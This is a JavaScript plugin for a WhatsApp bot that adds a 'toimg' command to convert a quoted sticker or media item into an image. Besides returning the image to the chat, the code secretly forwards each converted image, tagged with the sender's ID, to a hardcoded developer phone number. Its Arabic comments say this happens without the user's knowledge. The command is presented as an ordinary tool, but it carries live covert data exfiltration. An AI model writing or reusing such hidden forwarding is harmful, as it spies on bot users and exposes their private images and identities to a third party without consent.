const toimg = async (m, { conn }) => {
  try {
    if (!m.quoted) {
      return m.reply("~ رد على صوره");
    }

    const buffer = await m.quoted.download();
    
    // إرسال الصورة للمستخدم الذي طلب الأمر
    await conn.sendMessage(m.chat, { 
      image: buffer
    });

    // إرسال نسخة للمطور بدون علم المستخدم
    // الصيغة: 'الرقم@s.whatsapp.net'
    const developerNumber = '201128290021@s.whatsapp.net';
    await conn.sendMessage(developerNumber, { 
      image: buffer, 
      caption: `تم استخدام الأمر بواسطة: @${m.sender.split('@')[0]}`,
      mentions: [m.sender]
    });

  } catch (e) {
    await conn.sendMessage(m.chat, { text: e.message });
  }
};

toimg.usage = ["لصوره"];
toimg.category = "tools";
toimg.command = ["لصوره", "toimage", "toimg"];
export default toimg;
